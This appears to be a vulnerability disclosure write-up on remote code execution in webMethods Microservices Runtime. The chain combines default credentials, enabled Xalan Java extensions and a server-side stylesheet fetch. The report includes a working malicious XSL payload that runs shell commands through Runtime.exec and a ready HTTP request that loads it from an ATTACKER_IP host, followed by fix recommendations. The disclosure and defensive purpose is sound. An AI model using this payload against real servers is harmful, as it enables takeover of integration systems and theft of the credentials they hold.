# Software AG webMethods MSR — XSLT Xalan Java-Extension RCE (Default Credentials)

## 1. Research Target & Attack Surface

Software AG webMethods Microservices Runtime (MSR) 10.x is an enterprise integration runtime. It exposes an Integration Server (IS) that executes Java services over HTTP(S) and is frequently deployed in payment, logistics, and B2B integration backbones. We chose it because integration runtimes aggregate credentials and touch many internal systems — a compromise there is disproportionately valuable — and because its service-invocation model (ACL-gated Java services) is a classic place where "authorized feature" and "security boundary" drift apart.

The IS runs as the `sagadmin` service user (uid 1724 in a typical container deployment). Services are gated by ACLs: `aclread.cnf` defines default-deny package ACLs, and `aclmap_sm.cnf` defines per-service overrides. The relevant surface:

| Surface | Auth requirement | Notes |
|---|---|---|
| `pub.xslt.Transformations:transformSerialXML` | WmPrivate ACL (authenticated) | XSLT transform service — candidate sink |
| SOAP processor (`soap.java`) | Authenticated | Re-checks ACL on target service |
| `wm.admin.controller:execute` | Anonymous ACL, but denies Default user | 401 |
| `pub.utils:executeOSCommand` | Authenticated | `Runtime.exec` gated by empty allowlist |
| 9999 admin UI / DSP pages | Authenticated | 401/404 unauthenticated |

Service calls require ACL membership, and unauthenticated probing of the anonymous-ACL services, the SOAP processor, and the admin controller found no code-execution path. The practical entry is the authenticated XSLT service reached with the factory credential `Administrator:manage` — the IS startup log prints `"Default Administrator password is in use"` and `users.cnf` sets `changeOnLogin: No` (CWE-798), so a "protected" feature is effectively open in most deployments.

## 2. Sink Identification

With an authenticated foothold established, we looked for a code-execution sink inside an authorized service. The XSLT package stood out: `pub.xslt.Transformations:transformSerialXML` executes XSLT transformations, and XSLT engines historically ship dangerous extension mechanisms.

Decompiling `com.wm.pkg.xslt.XSLTModule` confirmed the suspicion. The factory is hardcoded to Xalan's `TransformerFactoryImpl`, and `initialize()` configures **only** an error listener:

```java
// XSLTModule.java:152-157
private static void initialize(Properties transformerProperties) throws ServiceException {
    TransformerFactory currentFactory = _factory;
    _factory = (TransformerFactory)Class.forName(factoryClassName).newInstance();
    _factory.setErrorListener(new XSLTErrorListener());
    // Missing: _factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)
}
```

`FEATURE_SECURE_PROCESSING` is never enabled. In Xalan, secure processing off means the Java extension namespace (`http://xml.apache.org/xalan/java`) is active by default — an XSL stylesheet can invoke arbitrary Java static and instance methods, including `java.lang.Runtime.exec`. That is the sink (CWE-94).

## 3. Source Identification & Controllability

The service signature gave us everything we needed. `transformSerialXML` requires `stylesheetSystemId` (the XSL URL or path) and takes the input XML via `systemId`/`fileName`/`bytes`/`xmlStream`. Both URL forms are resolved by `TemplatesCache.getStreamSource()`:

```java
// TemplatesCache.java:105-121
public static StreamSource getStreamSource(String key) throws ServiceException {
    StreamSource ss;
    if (key.startsWith("https://")) {
        NetURLConnection urlConnection = new NetURLConnection(new URL(key));
        InputStream is = urlConnection.getInputStream();   // server-side fetch
        ss = new StreamSource(is);
    } else {
        ss = new StreamSource(key);   // http:// / file:// resolved by SAX parser via systemId
    }
    return ss;
}
```

This is the second half of the vulnerability: the IS **actively fetches** the attacker-supplied `stylesheetSystemId` (CWE-918). The attacker simply hosts a malicious XSL on a listener the IS can reach — no MITM, no network-path interception, no local file write required. The `bytes` input path looked like an alternative, but it requires a Java `byte[]`; an HTTP form POST supplies a String and triggers a `ClassCastException`, so `systemId` (HTTP URL) is the reliable route.

## 4. End-to-End Data Flow

```
POST /invoke/pub.xslt.Transformations:transformSerialXML
  Authorization: Basic Administrator:manage
  stylesheetSystemId=http://<attacker>/evil.xsl   ← XSL fetched server-side
  systemId=http://<attacker>/input.xml            ← input XML fetched server-side
  resultType=bytes
    → TemplatesCache.getTemplate("http://<attacker>/evil.xsl")
    → xalan newTemplates(evil.xsl)  (Java extensions enabled)
    → transformer.transform(xmlSource, result)
    → XSL evaluation:
        fw:new('/tmp/wm_rce.sh')                   → FileWriter constructor
        fw:write($w, '#!/bin/sh\n<cmd>\n')         → write shell script
        fw:close($w)
        rt:exec(rt:getRuntime(), '/bin/sh /tmp/wm_rce.sh')  → Runtime.exec
        br:readLine(...)                            → capture stdout
    → XSLT result embedded in HTTP response
```

## 5. Exploit Construction

The first naive idea — `rt:exec(rt:getRuntime(), "id > /tmp/out")` — fails because a single-string `Runtime.exec` splits on whitespace: pipe and redirection semantics are lost. The fix is to write the command into a script with `FileWriter` and execute `/bin/sh /tmp/wm_rce.sh`, which gives full shell semantics:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:fw="http://xml.apache.org/xalan/java/java.io.FileWriter"
  xmlns:proc="http://xml.apache.org/xalan/java/java.lang.Process"
  xmlns:br="http://xml.apache.org/xalan/java/java.io.BufferedReader"
  xmlns:ir="http://xml.apache.org/xalan/java/java.io.InputStreamReader">
  <xsl:template match="/">
    <rce>
      <xsl:variable name="w" select="fw:new('/tmp/wm_rce.sh')"/>
      <xsl:value-of select="fw:write($w, '#!/bin/sh&#10;id&#10;')"/>
      <xsl:value-of select="fw:close($w)"/>
      <xsl:variable name="p" select="rt:exec(rt:getRuntime(), '/bin/sh /tmp/wm_rce.sh')"/>
      <xsl:variable name="in" select="proc:getInputStream($p)"/>
      <xsl:variable name="reader" select="br:new(ir:new($in))"/>
      <output><xsl:value-of select="br:readLine($reader)"/></output>
    </rce>
  </xsl:template>
</xsl:stylesheet>
```

The attacker hosts `/evil.xsl` and `/input.xml` on a listener (the IS must be able to reach it) and sends:

```http
POST /invoke/pub.xslt.Transformations:transformSerialXML HTTP/1.1
Authorization: Basic QWRtaW5pc3RyYXRvcjptYW5hZ2U=
Content-Type: application/x-www-form-urlencoded

stylesheetSystemId=http://<ATTACKER_IP>:8899/evil.xsl&systemId=http://<ATTACKER_IP>:8899/input.xml&resultType=bytes&loadExternalEntities=true
```

There is one operational pitfall: `TemplatesCache` caches templates by `stylesheetSystemId`. Iterating payloads requires either clearing the cache (`pub.xslt.Cache:removeAllTemplates`) or varying the URL (append a random query parameter).

## 6. Dynamic Verification

Verified on webMethods MSR 10.x (JDK 11.0.19, Alpine):

1. Confirm the default credential works (startup log + login).
2. Host `evil.xsl` + `input.xml`; send the request.
3. HTTP 200; the response `bytes` field contains:

```xml
<?xml version="1.0" encoding="UTF-8"?><rce><output>uid=1724(sagadmin) gid=1724(sagadmin) groups=1724(sagadmin)</output></rce>
```

4. A second command (`cat /etc/passwd`) confirms arbitrary command execution — the output is real, not a canned response.

The PoC script automates login, XSL/XML hosting, request, and output parsing (pure Python standard library).

## 7. Reachability & Impact

- **Network**: any host that can reach the IS HTTP port
- **Auth**: factory default `Administrator:manage` (no forced change) — CWE-798
- **Precondition**: attacker hosts an HTTP listener reachable from the IS
- **Privilege**: `sagadmin` (uid 1724) — the Integration Server service user

The impact is a default-credential remote code execution as the integration runtime's service user: full compromise of the IS, including every adapter credential, partner connection, and orchestrated backend the runtime touches. For a product whose entire purpose is integrating enterprise systems, that is effectively a gateway into the surrounding network.

## 8. Fix Recommendations

1. Enable `FEATURE_SECURE_PROCESSING` on the XSLT transformer factory, or disable Xalan Java extension functions entirely
2. Enforce password change for the default `Administrator` account at install/upgrade time
3. Restrict `transformSerialXML` via ACLs to trusted principals
4. Block server-side fetches of untrusted `stylesheetSystemId`/`systemId` URLs (validate scheme and host)
5. Run the Integration Server under a least-privilege account
